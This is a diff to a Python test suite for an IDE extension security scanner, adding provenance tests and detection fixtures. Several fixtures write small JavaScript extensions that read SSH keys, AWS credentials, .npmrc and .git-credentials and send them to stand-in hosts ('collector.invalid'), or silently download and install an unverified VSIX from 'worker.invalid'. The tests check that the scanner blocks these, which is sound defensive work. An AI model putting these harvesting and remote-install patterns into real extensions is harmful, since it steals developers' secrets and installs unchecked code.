@@ -48,11 +48,15 @@ class ScannerTests(unittest.TestCase):
             report = MagicMock()
             report.extension_id = "publisher.extension"
             report.version = "1.2.3"
+            report.artifact_hash = digest
             report.artifact_identity = {"sha256": digest}
             report.artifact_inventory = {}
             metadata = {
                 "extension_id": "publisher.extension", "version": "1.2.3",
                 "registry": "vs-marketplace", "target_platform": "linux-x64",
+                "expected_sha256": digest, "sha256_verified": "true",
+                "signature_asset_declared": "true",
+                "integrity_metadata_matches_artifact": "true",
             }
 
             def download(*_args, registry_out, **_kwargs):
@@ -68,12 +72,15 @@ class ScannerTests(unittest.TestCase):
                 )
 
             store.preserve.assert_called_once()
-            scan.assert_called_once_with(preserved, known_bad_hashes=None)
+            scan.assert_called_once_with(preserved, known_bad_hashes=None, artifact_origin="archive_artifact")
             self.assertFalse(downloaded.exists())
             self.assertTrue(preserved.exists())
             self.assertEqual(result.artifact_identity["target_platform"], "linux-x64")
             self.assertEqual(result.artifact_identity["storage"]["sha256"], digest)
             self.assertEqual(result.artifact_inventory["artifact_storage"]["storage_key"], store.preserve.return_value.storage_key)
+            self.assertTrue(result.artifact_identity["signature"]["present"])
+            self.assertFalse(result.artifact_identity["signature"]["verified"])
+            self.assertTrue(result.artifact_identity["signature"]["package_integrity"]["matched"])
             self.assertNotIn(str(Path(tmp) / "vault"), json.dumps(result.artifact_identity))
 
     def test_marketplace_preservation_failure_is_incomplete_and_deletes_download(self) -> None:
@@ -253,7 +260,7 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(bundle["metadata"]["schema_version"], "2.3")
         self.assertEqual(bundle["metadata"]["profile"], "smart")
         self.assertEqual(bundle["metadata"]["source"], "fixtures")
-        self.assertEqual(bundle["metadata"]["policy_version"], "3.0.0-calibration.3")
+        self.assertEqual(bundle["metadata"]["policy_version"], "3.1.0-calibration.2")
         self.assertEqual(bundle["metadata"]["scanner_build"], report["scanner_build"])
         self.assertEqual(bundle["metadata"]["ruleset_version"], report["ruleset_version"])
         self.assertEqual(bundle["summary"]["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
@@ -1289,7 +1296,54 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(scanned["verdict"], "clean")
         self.assertEqual(len(scanned["artifact_inventory"]["vsix_hash"]), 64)
         self.assertEqual(scanned["artifact_inventory"]["source_artifact"], "sample.vsix")
+        self.assertEqual(scanned["artifact_identity"]["artifact_origin"], "user_uploaded_vsix")
+        self.assertFalse(scanned["artifact_identity"]["original_registry_artifact"])
         self.assertEqual(scanned["artifact_inventory"]["vsix_signature"]["present"], False)
+
+    def test_archived_vsix_and_source_snapshot_have_distinct_provenance(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            source = root / "source"
+            source.mkdir()
+            (source / "package.json").write_text(
+                '{"publisher":"example","name":"source","version":"1.0.0"}', encoding="utf-8"
+            )
+            vsix = root / "archived.vsix"
+            with zipfile.ZipFile(vsix, "w") as archive:
+                archive.writestr("extension/package.json", '{"publisher":"example","name":"archive","version":"1.0.0"}')
+
+            source_report = scan_targets(paths=[source], path_artifact_origin="source_snapshot")
+            archive_report = scan_targets(paths=[vsix], path_artifact_origin="archive_artifact")
+
+        source_identity = source_report["extensions"][0]["artifact_identity"]
+        archive_identity = archive_report["extensions"][0]["artifact_identity"]
+        self.assertEqual(source_identity["artifact_origin"], "source_snapshot")
+        self.assertFalse(source_identity["original_registry_artifact"])
+        self.assertEqual(archive_identity["artifact_origin"], "archive_artifact")
+        self.assertFalse(archive_identity["original_registry_artifact"])
+
+    def test_incompatible_artifact_origin_is_rejected(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            vsix = root / "sample.vsix"
+            vsix.write_bytes(b"not-opened")
+            with self.assertRaisesRegex(ValueError, "cannot describe a VSIX"):
+                scan_targets(paths=[vsix], path_artifact_origin="source_snapshot")
+
+    def test_hash_pinned_remote_artifact_is_not_claimed_as_registry_original(self) -> None:
+        with TemporaryDirectory() as tmp:
+            vsix = Path(tmp) / "remote.vsix"
+            with zipfile.ZipFile(vsix, "w") as archive:
+                archive.writestr("extension/package.json", '{"publisher":"example","name":"remote","version":"1.0.0"}')
+            digest = hashlib.sha256(vsix.read_bytes()).hexdigest()
+            with patch("ide_scanner.scanner.acquire_https_vsix", return_value=vsix):
+                report = scan_targets(artifact_url="https://example.com/remote.vsix", artifact_sha256=digest)
+
+        scanned = report["extensions"][0]
+        self.assertEqual(scanned["artifact_identity"]["artifact_origin"], "archive_artifact")
+        self.assertFalse(scanned["artifact_identity"]["original_registry_artifact"])
+        self.assertTrue(scanned["artifact_identity"]["sha256_verified"])
+        self.assertNotIn("example.com", json.dumps(scanned))
 
     def test_known_bad_vsix_hash_feed_is_authoritative_malware(self) -> None:
         with TemporaryDirectory() as tmp:
@@ -1594,6 +1648,168 @@ class ScannerTests(unittest.TestCase):
         self.assertGreaterEqual(report.risk_score, report.malware_score)
         self.assertIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})
 
+    def test_cross_function_systematic_credential_harvesting_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"harvester","version":"1.0.0",'
+                '"activationEvents":["onStartupFinished"]}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const fs=require('fs'),os=require('os'),https=require('https');\n"
+                "const targets=['/.aws/credentials','/.npmrc','/.git-credentials','/.env'];\n"
+                "async function collect(){const home=os.homedir(); const entries=fs.readdirSync(home); "
+                "return {passwords:entries.map(x=>fs.readFileSync(home+'/'+x)),apiKeys:[],awsKeys:[],vaults:{}};}\n"
+                "function transmit(data){const body=JSON.stringify(data); "
+                "const req=https.request({hostname:'collector.invalid',method:'POST'}); req.write(body); req.end();}\n"
+                "collect().then(transmit);",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        finding = next(
+            item for item in report.findings
+            if item.rule_id == "credential-harvesting-exfiltration"
+        )
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "block")
+        self.assertEqual(report.malware_authority, "non_authoritative")
+        self.assertEqual(finding.evidence["correlation"], "same-file-interprocedural-semantic-chain")
+        self.assertGreaterEqual(len(finding.evidence["credential_families"]), 3)
+
+    def test_same_file_identifier_linked_credential_exfiltration_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"identifier-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text(
+                "const secret=fs.readFileSync(home+'/.ssh/id_ed25519');"
+                "const payload=JSON.stringify(secret);const body=payload;req.write(body);",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
+        self.assertEqual(report.decision, "block")
+        self.assertEqual(report.malware_authority, "non_authoritative")
+        self.assertEqual(finding.evidence["variable_path"], ["secret", "payload", "body"])
+
+    def test_function_parameter_linked_credential_exfiltration_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"parameter-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text(
+                "function transmit(data){const req=https.request(options);req.write(data)}"
+                "const secret=fs.readFileSync(home+'/.aws/credentials');transmit(secret);",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
+        self.assertEqual(report.decision, "block")
+        self.assertEqual(finding.evidence["correlation"], "same-file-function-parameter-value-flow")
+
+    def test_object_property_linked_credential_exfiltration_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"object-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text(
+                "const collected={};const key=fs.readFileSync(home+'/.ssh/id_ed25519');"
+                "collected.sshKey=key;const body=JSON.stringify(collected);req.write(body);",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
+        self.assertEqual(report.decision, "block")
+        self.assertIn("collected.sshKey", finding.evidence["variable_path"])
+
+    def test_function_return_linked_credential_exfiltration_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"return-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text(
+                "function encode(value){return JSON.stringify(value)}"
+                "const secret=fs.readFileSync(home+'/.npmrc');const body=encode(secret);req.write(body);",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
+        self.assertEqual(report.decision, "block")
+        self.assertIn("encode:value:return", finding.evidence["variable_path"])
+
+    def test_cross_file_directed_credential_harvesting_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"split-harvester","version":"1.0.0","main":"collector.js"}', encoding="utf-8"
+            )
+            (root / "collector.js").write_text(
+                "const fs=require('fs');fs.readFileSync(home+'/.ssh/id_ed25519');"
+                "fs.readFileSync(home+'/.aws/credentials');fs.readFileSync(home+'/.npmrc');require('./encode');",
+                encoding="utf-8",
+            )
+            (root / "encode.js").write_text("const body=JSON.stringify(data);require('./send');", encoding="utf-8")
+            (root / "send.js").write_text("const req=https.request(options);req.write(body);", encoding="utf-8")
+            report = scan_extension(root)
+
+        finding = next(
+            item for item in report.findings
+            if item.rule_id == "credential-harvesting-exfiltration"
+            and item.evidence.get("correlation") == "cross-file-import-directed-semantic-chain"
+        )
+        self.assertEqual(report.decision, "block")
+        self.assertEqual(finding.evidence["import_path"], ["collector.js", "encode.js", "send.js"])
+
+    def test_module_flow_resource_limit_makes_scan_incomplete(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"flow-limit","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text("require('./helper')", encoding="utf-8")
+            (root / "helper.js").write_text("module.exports={}", encoding="utf-8")
+            with patch("ide_scanner.module_flow.MAX_FLOW_MODULES", 1):
+                report = scan_extension(root)
+
+        provider = report.analysis_coverage["providers"]["module_flow"]
+        self.assertEqual(provider["status"], "failed")
+        self.assertTrue(provider["required"])
+        self.assertEqual(report.analysis_coverage["status"], "incomplete")
+        self.assertEqual(report.decision, "incomplete")
+
+    def test_single_credential_family_backup_client_does_not_trigger_harvesting_chain(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"backup","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const fs=require('fs'),os=require('os'),https=require('https');\n"
+                "const home=os.homedir(); const entries=fs.readdirSync(home);\n"
+                "const data=fs.readFileSync(home+'/.npmrc'); const body=JSON.stringify(data);\n"
+                "const req=https.request({hostname:'backup.example',method:'POST'}); req.write(body); req.end();",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertNotIn(
+            "credential-harvesting-exfiltration",
+            {finding.rule_id for finding in report.findings},
+        )
+
     def test_standalone_download_execute_requires_review_not_block(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
@@ -1612,6 +1828,65 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(report.verdict, "suspicious")
         self.assertEqual(report.decision, "review")
         self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})
+
+    def test_unverified_remote_vsix_install_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"silent-updater","version":"1.0.0"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text(
+                "const vscode=require('vscode'),https=require('https'),fs=require('fs');"
+                "https.get('https://worker.invalid/update.vsix',res=>{"
+                "const out=fs.createWriteStream('/tmp/update.vsix');res.pipe(out);"
+                "vscode.commands.executeCommand('workbench.extensions.installExtension','/tmp/update.vsix');});",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "remote-vsix-install-chain")
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "block")
+        self.assertEqual(report.malware_authority, "non_authoritative")
+        self.assertEqual(finding.evidence["sink"], "workbench.extensions.installExtension")
+        self.assertFalse(finding.evidence["integrity_verification"])
+
+    def test_hash_verified_remote_vsix_install_does_not_trigger_chain(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"verified-updater","version":"1.0.0"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text(
+                "const vscode=require('vscode'),https=require('https'),fs=require('fs'),crypto=require('crypto');"
+                "https.get('https://vendor.example/update.vsix',res=>{"
+                "const out=fs.createWriteStream('/tmp/update.vsix');res.pipe(out);"
+                "const expectedHash='abc';const actual=crypto.createHash('sha256').update(data).digest('hex');"
+                "if(actual === expectedHash)vscode.commands.executeCommand('workbench.extensions.installExtension','/tmp/update.vsix');});",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        self.assertNotIn("remote-vsix-install-chain", {item.rule_id for item in report.findings})
+
+    def test_cross_file_import_connected_remote_vsix_install_is_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"split-updater","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
+            )
+            (root / "extension.js").write_text("require('./network');", encoding="utf-8")
+            (root / "network.js").write_text("require('./installer'); fetch('https://worker.invalid/u.vsix');", encoding="utf-8")
+            (root / "installer.js").write_text(
+                "fs.writeFile('/tmp/u.vsix', data); vscode.commands.executeCommand('workbench.extensions.installExtension','/tmp/u.vsix');",
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "remote-vsix-install-chain")
+        self.assertEqual(report.decision, "block")
+        self.assertEqual(finding.evidence["correlation"], "cross-file-import-connected-semantic-chain")
+        self.assertEqual(finding.evidence["stages"]["download"], ["network.js"])
 
     def test_automatic_credential_aware_download_execute_is_preventively_blocked(self) -> None:
         with TemporaryDirectory() as tmp:
